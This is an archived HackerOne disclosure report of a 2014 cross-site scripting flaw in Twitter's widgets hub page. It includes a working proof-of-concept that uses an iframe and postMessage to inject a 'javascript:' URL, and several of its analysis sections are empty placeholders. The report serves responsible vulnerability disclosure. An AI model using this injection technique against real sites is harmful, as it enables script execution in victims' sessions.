# XSS platform.twitter.com

## Metadata
- **Source:** HackerOne
- **Report:** 29328 | https://hackerone.com/reports/29328
- **Submitted:** 2014-09-28
- **Reporter:** batram
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
Since you have fixed a few problems with the FlashTransport on platform.twitter.com already,
I though I would also take a look at the JavaScript around it.

_Problem URL:_
https://platform.twitter.com/widgets/hub.html

__Description:__
The mentioned page opens URLs send to it via postMessage or FlashTransport without checking for an 'javascript:'-prefix, resulting in XSS on platform.twitter

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Since you have fixed a few problems with the FlashTransport on platform.twitter.com already,
I though I would also take a look at the JavaScript around it.

_Problem URL:_
https://platform.twitter.com/widgets/hub.html

__Description:__
The mentioned page opens URLs send to it via postMessage or FlashTransport without checking for an 'javascript:'-prefix, resulting in XSS on platform.twitter.com. Since the URL gets open in a popup, popups need to be allowed or the opening a result of user interaction. 

__PoC:__

    <iframe src="https://platform.twitter.com/widgets/hub.html" id="iframe"></iframe>

    <script>
      var win = document.getElementById("iframe").contentWindow

      function fire() {
        win.postMessage(
          '{"id": 12, "method": "openIntent", "params":["javascript:alert(document.domain)"]}',
          "https://platform.twitter.com/" 
        )
      }

      function listener(e){
        console.log(e.data);
        if(e.data == '__ready__')
          fire();
      }

      if (window.addEventListener){
        addEventListener("message", listener, false)
      } else {
        attachEvent("onmessage", listener)
      }
    </script>


Tested in:
 Win 8.1 | Google Chrome | Version 39.0.2166.2 dev-m (64-bit)


</details>

---
*Analysed by Claude on 2026-05-24*
